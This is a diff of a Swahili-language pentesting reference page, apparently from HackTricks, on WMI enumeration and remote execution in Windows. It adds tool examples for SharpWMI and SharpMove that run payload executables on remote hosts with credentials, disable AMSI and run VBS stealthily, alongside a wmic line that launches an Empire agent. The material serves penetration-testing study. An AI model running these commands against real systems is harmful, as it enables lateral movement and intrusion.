@@ -6,13 +6,13 @@
 
 Mchakato unaweza kufunguliwa kwenye mwenyeji ambapo jina la mtumiaji na ama nenosiri au hash vinajulikana kupitia matumizi ya WMI. Amri zinafanywa kwa kutumia WMI na Wmiexec, ikitoa uzoefu wa shell wa nusu-interactive.
 
-**dcomexec.py:** Kutumia mwisho tofauti wa DCOM, skripti hii inatoa shell ya nusu-interactive inayofanana na wmiexec.py, hasa ikitumia kitu cha DCOM cha ShellBrowserWindow. Hivi sasa inasaidia MMC20. Maombi, Windows za Shell, na vitu vya Shell Browser Window. (chanzo: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
+**dcomexec.py:** Kutumia mwisho tofauti za DCOM, skripti hii inatoa shell ya nusu-interactive inayofanana na wmiexec.py, hasa ikitumia kitu cha DCOM cha ShellBrowserWindow. Hivi sasa inasaidia MMC20. Maombi, Windows za Shell, na vitu vya Shell Browser Window. (chanzo: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))
 
 ## Misingi ya WMI
 
 ### Namespace
 
-Imeundwa katika muundo wa hierarchi ya directory, kontena la juu la WMI ni \root, chini ambayo directories za ziada, zinazojulikana kama namespaces, zimepangwa. 
+Imeandaliwa katika muundo wa hierarchi ya directory, kontena la juu la WMI ni \root, chini ya ambayo directories za ziada, zinazojulikana kama namespaces, zimepangwa. 
 Amri za kuorodhesha namespaces:
 ```bash
 # Retrieval of Root namespaces
@@ -31,8 +31,7 @@ gwmi -Namespace "root/microsoft" -List -Recurse
 ```
 ### **Darasa**
 
-Kujua jina la darasa la WMI, kama win32_process, na nafasi ambayo linaishi ni muhimu kwa operesheni yoyote ya WMI. 
-Amri za kuorodhesha madarasa yanayoanza na `win32`:
+Kujua jina la darasa la WMI, kama win32_process, na namespace iliyo ndani yake ni muhimu kwa operesheni yoyote ya WMI. Amri za kuorodhesha madarasa yanayoanza na `win32`:
 ```bash
 Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
 gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
@@ -87,7 +86,7 @@ wmic sysaccount list /format:list
 ```
 Kuchunguza kwa mbali WMI kwa habari maalum, kama wasimamizi wa ndani au watumiaji walioingia, kunawezekana kwa ujenzi wa amri kwa makini.
 
-### **Kuchunguza WMI kwa Mbali kwa Mikono**
+### **Kuchunguza WMI kwa Mikono kwa Mbali**
 
 Utambuzi wa kimya wa wasimamizi wa ndani kwenye mashine ya mbali na watumiaji walioingia unaweza kufanywa kupitia maswali maalum ya WMI. `wmic` pia inasaidia kusoma kutoka kwa faili ya maandiko ili kutekeleza amri kwenye nodi nyingi kwa wakati mmoja.
 
@@ -95,11 +94,7 @@ Ili kutekeleza mchakato kwa mbali kupitia WMI, kama vile kupeleka wakala wa Empi
 ```bash
 wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
 ```
-Hii mchakato inaonyesha uwezo wa WMI wa utekelezaji wa mbali na uainishaji wa mfumo, ikisisitiza matumizi yake kwa usimamizi wa mfumo na pentesting.
-
-## Marejeleo
-
-- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+Mchakato huu unaonyesha uwezo wa WMI wa utekelezaji wa mbali na uainishaji wa mfumo, ukisisitiza matumizi yake kwa usimamizi wa mfumo na pentesting.
 
 ## Zana za Kiotomatiki
 
@@ -107,4 +102,24 @@ Hii mchakato inaonyesha uwezo wa WMI wa utekelezaji wa mbali na uainishaji wa mf
 ```bash
 SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
 ```
+- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
+```bash
+SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
+# Stealthier execution with VBS
+SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
+```
+- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
+```bash
+SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
+SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
+SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
+```
+- Unaweza pia kutumia **Impacket's `wmiexec`**.
+
+
+## Marejeo
+
+- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
+
+
 {{#include ../../banners/hacktricks-training.md}}
